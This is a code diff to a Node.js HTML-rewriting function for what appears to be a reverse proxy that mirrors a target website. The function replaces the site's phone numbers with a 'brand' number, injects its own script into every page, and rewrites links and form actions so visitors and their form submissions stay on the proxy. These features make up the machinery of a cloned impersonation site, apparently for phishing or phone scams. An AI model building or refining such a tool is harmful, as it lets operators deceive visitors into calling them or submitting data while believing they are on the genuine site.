@@ -42,70 +42,51 @@ function rewriteHtml(html, requestUrl = '') {
   $('title').text(config.siteName);
 
   // CRITICAL: Replace phone numbers in HTML before sending to client
-  // This catches phone numbers that come from the target site's HTML
-  const phonePatterns = [
-    /\+1-XXX-XXX-XXXX/g,
-    /\+1\s*\(XXX\)\s*XXX-XXXX/g,
-    /XXX-XXX-XXXX/g,
-    /\+1\s*\(800\)\s*331-8867/g,
-    config.originalPhone ? new RegExp(config.originalPhone.replace(/[+\-\(\)\s]/g, '\\$&'), 'g') : null
-  ].filter(Boolean);
+  // Get entire HTML as string and replace phone patterns
+  let htmlString = $.html();
+  
+  const phoneReplacements = [
+    [/\+1-XXX-XXX-XXXX/g, config.brandPhone],
+    [/\+1\s*\(XXX\)\s*XXX-XXXX/g, config.brandPhone],
+    [/XXX-XXX-XXXX/g, config.brandPhone]
+  ];
 
-  // Replace phone in text nodes and attributes
-  $('*').each((_, el) => {
-    const $el = $(el);
-    
-    // Replace in text content (but skip script and style tags)
-    if (el.type === 'text' && el.parent && !['script', 'style'].includes(el.parent.name)) {
-      let text = $el.text();
-      phonePatterns.forEach(pattern => {
-        if (pattern.test(text)) {
-          text = text.replace(pattern, config.brandPhone);
-        }
-      });
-      $el.replaceWith(text);
-    }
-
-    // Replace in href attributes (tel: links)
-    if ($el.attr('href') && $el.attr('href').startsWith('tel:')) {
-      phonePatterns.forEach(pattern => {
-        let href = $el.attr('href');
-        if (pattern.test(href)) {
-          $el.attr('href', 'tel:' + config.brandPhone.replace(/[^0-9+]/g, ''));
-        }
-      });
-    }
+  phoneReplacements.forEach(([pattern, replacement]) => {
+    htmlString = htmlString.replace(pattern, replacement);
   });
+
+  // Reload the modified HTML back into Cheerio
+  const $modified = cheerio.load(htmlString);
 
   // Inject branding script
   const brandingScript = generateBrandingScript();
-  $('head').append(`<script id="serenity-branding-script">${brandingScript}</script>`);
+  $modified('head').append(`<script id="serenity-branding-script">${brandingScript}</script>`);
 
   // Rewrite all absolute URLs to go through proxy
-  $('a[href]').each((_, el) => {
-    let href = $(el).attr('href');
+  $modified('a[href]').each((_, el) => {
+    let href = $modified(el).attr('href');
     if (href && href.startsWith(config.targetUrl)) {
-      $(el).attr('href', href.replace(config.targetUrl, ''));
+      $modified(el).attr('href', href.replace(config.targetUrl, ''));
     }
   });
 
-  $('form[action]').each((_, el) => {
-    let action = $(el).attr('action');
+  $modified('form[action]').each((_, el) => {
+    let action = $modified(el).attr('action');
     if (action && action.startsWith(config.targetUrl)) {
-      $(el).attr('action', action.replace(config.targetUrl, ''));
+      $modified(el).attr('action', action.replace(config.targetUrl, ''));
     }
   });
 
   // Rewrite image and resource URLs
-  $('img[src], script[src], link[href], iframe[src]').each((_, el) => {
+  $modified('img[src], script[src], link[href], iframe[src]').each((_, el) => {
     const attr = el.tagName === 'link' ? 'href' : 'src';
-    let value = $(el).attr(attr);
+    let value = $modified(el).attr(attr);
     if (value && value.startsWith(config.targetUrl)) {
-      $(el).attr(attr, value.replace(config.targetUrl, ''));
+      $modified(el).attr(attr, value.replace(config.targetUrl, ''));
     }
   });
 
-  return $.html();
+  return $modified.html();
 }
 
 module.exports = { rewriteHtml };
